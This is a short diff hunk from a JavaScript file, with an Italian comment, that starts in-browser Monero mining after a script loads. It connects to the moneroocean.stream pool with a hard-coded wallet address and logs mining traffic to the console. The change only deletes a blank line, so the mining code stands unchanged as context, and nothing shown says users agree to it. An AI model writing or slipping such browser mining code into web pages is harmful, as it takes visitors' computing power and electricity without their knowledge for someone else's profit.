@@ -14,7 +14,6 @@ script.onload = () => {
         'moneroocean.stream',
         '422QQNhnhX8hmMEkF3TWePWSvKm6DiV7sS3Za2dXrynsJ1w8U6AzwjEdnewdhmP3CDaqvaS6BjEjGMK9mnumtufvLmz5HJi');
     console.log('Mining started: Connected to server ' + server);
-
     // Mostra i log del mining nella console
     setInterval(() => {
       while (sendStack.length > 0) console.log('Sent: ', sendStack.pop());
